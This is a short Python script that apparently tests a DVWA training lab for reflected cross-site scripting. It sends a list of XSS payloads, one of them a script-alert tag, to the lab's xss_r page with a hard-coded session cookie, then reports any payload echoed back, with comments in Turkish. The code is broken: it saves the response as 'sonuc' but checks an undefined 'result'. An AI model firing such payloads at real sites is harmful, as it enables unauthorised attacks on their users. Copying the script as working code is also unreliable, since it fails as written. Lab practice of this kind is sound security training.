import requests
header={"Cookie": "security=low; PHPSESSID=a0b29e43b154e8cf261c3a93686bddd94"}
xss_list=["siber","<h1>siber", "<script>alert('siber')</script>"]
for payload in xss_list:
    print(payload)
    url="http://10.10.10.10/dvwa/vulnerabilities/xss_r/?name="+str(payload)
    sonuc=requests.get(url=url, headers=header)
    if str(payload) in str(result.content):
        print("Muhtemelen XSS var: ", str(payload))